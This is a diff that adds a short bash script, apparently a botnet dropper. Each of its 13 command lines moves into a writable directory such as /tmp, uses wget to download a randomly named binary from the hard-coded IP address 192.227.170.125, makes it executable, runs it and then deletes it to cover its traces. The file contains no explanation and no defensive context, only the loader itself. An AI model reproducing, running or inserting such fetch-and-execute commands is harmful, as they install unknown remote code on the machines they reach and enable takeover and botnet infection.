@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/fsdfdsd; chmod +x fsdfdsd; ./fsdfdsd; rm -rf fsdfdsd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/fgdg; chmod +x fgdg; ./fgdg; rm -rf fgdg
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/fgfgdf; chmod +x fgfgdf; ./fgfgdf; rm -rf fgfgdf
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/fdhdfsh; chmod +x fdhdfsh; ./fdhdfsh; rm -rf fdhdfsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/hdfshdf; chmod +x hdfshdf; ./hdfshdf; rm -rf hdfshdf
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/ngsngfs; chmod +x ngsngfs; ./ngsngfs; rm -rf ngsngfs
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/ngsggdfn; chmod +x ngsggdfn; ./ngsggdfn; rm -rf ngsggdfn
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/ngsgngn; chmod +x ngsgngn; ./ngsgngn; rm -rf ngsgngn
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/gnsn; chmod +x gnsn; ./gnsn; rm -rf gnsn
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/gnfsng; chmod +x gnfsng; ./gnfsng; rm -rf gnfsng
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/bfdbdfbr; chmod +x bfdbdfbr; ./bfdbdfbr; rm -rf bfdbdfbr
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.227.170.125/fdbdfbdbf; chmod +x fdbdfbdbf; ./fdbdfbdbf; rm -rf fdbdfbdbf
